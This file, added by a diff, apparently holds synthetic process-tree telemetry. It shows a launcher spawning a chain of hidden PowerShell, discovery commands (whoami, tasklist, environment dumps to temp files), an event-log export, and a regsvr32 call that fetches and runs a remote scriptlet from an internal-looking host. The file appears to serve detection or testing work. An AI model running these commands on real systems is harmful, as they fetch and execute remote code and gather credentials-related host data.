@@ -1,0 +1,158 @@
+{
+  "pid": 208694,
+  "ppid": 0,
+  "name": "scriptlauncher.exe",
+  "command": "scriptlauncher.exe /diag",
+  "children": [
+    {
+      "pid": 208699,
+      "ppid": 208694,
+      "name": "cmd.exe",
+      "command": "cmd.exe /c \"set\"",
+      "children": [
+        {
+          "pid": 208704,
+          "ppid": 208699,
+          "name": "powershell.exe",
+          "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 3\"",
+          "children": [
+            {
+              "pid": 208709,
+              "ppid": 208704,
+              "name": "regsvr32.exe",
+              "command": "regsvr32.exe /s /n /u /i:\"http://intra-update.corp.local/scripts/sync.sct\" scrobj.dll",
+              "children": [
+                {
+                  "pid": 208714,
+                  "ppid": 208709,
+                  "name": "tasklist.exe",
+                  "command": "tasklist.exe /v",
+                  "children": [
+                    {
+                      "pid": 208718,
+                      "ppid": 208714,
+                      "name": "whoami.exe",
+                      "command": "whoami.exe > \"C:\\Users\\dev.nair\\AppData\\Local\\Temp\\who_ab231cb1.txt\"",
+                      "children": [
+                        {
+                          "pid": 208719,
+                          "ppid": 208718,
+                          "name": "timeout.exe",
+                          "command": "timeout.exe /t 25 /nobreak",
+                          "children": [
+                            {
+                              "pid": 208724,
+                              "ppid": 208719,
+                              "name": "powershell.exe",
+                              "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 23\"",
+                              "children": []
+                            }
+                          ]
+                        }
+                      ]
+                    },
+                    {
+                      "pid": 208725,
+                      "ppid": 208714,
+                      "name": "whoami.exe",
+                      "command": "whoami.exe /all > \"C:\\Users\\dev.nair\\AppData\\Local\\Temp\\who_96785db5.txt\"",
+                      "children": [
+                        {
+                          "pid": 208732,
+                          "ppid": 208725,
+                          "name": "cmd.exe",
+                          "command": "cmd.exe /c \"set\"",
+                          "children": [
+                            {
+                              "pid": 208739,
+                              "ppid": 208732,
+                              "name": "whoami.exe",
+                              "command": "whoami.exe /priv > \"C:\\Users\\dev.nair\\AppData\\Local\\Temp\\who_ecfebffb.txt\"",
+                              "children": [
+                                {
+                                  "pid": 208743,
+                                  "ppid": 208739,
+                                  "name": "whoami.exe",
+                                  "command": "whoami.exe > \"C:\\Users\\dev.nair\\AppData\\Local\\Temp\\who_141903c4.txt\"",
+                                  "children": [
+                                    {
+                                      "pid": 208744,
+                                      "ppid": 208743,
+                                      "name": "findstr.exe",
+                                      "command": "findstr.exe /i \"failed\" \"C:\\ProgramData\\Litware\\Logs\\profile.log\"",
+                                      "children": [
+                                        {
+                                          "pid": 208746,
+                                          "ppid": 208744,
+                                          "name": "timeout.exe",
+                                          "command": "timeout.exe /t 25 /nobreak",
+                                          "children": [
+                                            {
+                                              "pid": 208750,
+                                              "ppid": 208746,
+                                              "name": "wevtutil.exe",
+                                              "command": "wevtutil.exe epl \"System\" \"C:\\ProgramData\\Northwind\\Logs\\System_ecdab6f9.evtx\"",
+                                              "children": [
+                                                {
+                                                  "pid": 208753,
+                                                  "ppid": 208750,
+                                                  "name": "tasklist.exe",
+                                                  "command": "tasklist.exe /v",
+                                                  "children": [
+                                                    {
+                                                      "pid": 208758,
+                                                      "ppid": 208753,
+                                                      "name": "hostname.exe",
+                                                      "command": "hostname.exe",
+                                                      "children": [
+                                                        {
+                                                          "pid": 208764,
+                                                          "ppid": 208758,
+                                                          "name": "whoami.exe",
+                                                          "command": "whoami.exe > \"C:\\Users\\dev.nair\\AppData\\Local\\Temp\\who_ff7d91e2.txt\"",
+                                                          "children": [
+                                                            {
+                                                              "pid": 208766,
+                                                              "ppid": 208764,
+                                                              "name": "powershell.exe",
+                                                              "command": "powershell.exe -NoProfile -WindowStyle Hidden -Command \"Start-Sleep -Seconds 3\"",
+                                                              "children": [
+                                                                {
+                                                                  "pid": 208773,
+                                                                  "ppid": 208766,
+                                                                  "name": "ping.exe",
+                                                                  "command": "ping.exe -n 12 127.0.0.1 > nul",
+                                                                  "children": []
+                                                                }
+                                                              ]
+                                                            }
+                                                          ]
+                                                        }
+                                                      ]
+                                                    }
+                                                  ]
+                                                }
+                                              ]
+                                            }
+                                          ]
+                                        }
+                                      ]
+                                    }
+                                  ]
+                                }
+                              ]
+                            }
+                          ]
+                        }
+                      ]
+                    }
+                  ]
+                }
+              ]
+            }
+          ]
+        }
+      ]
+    }
+  ]
+}
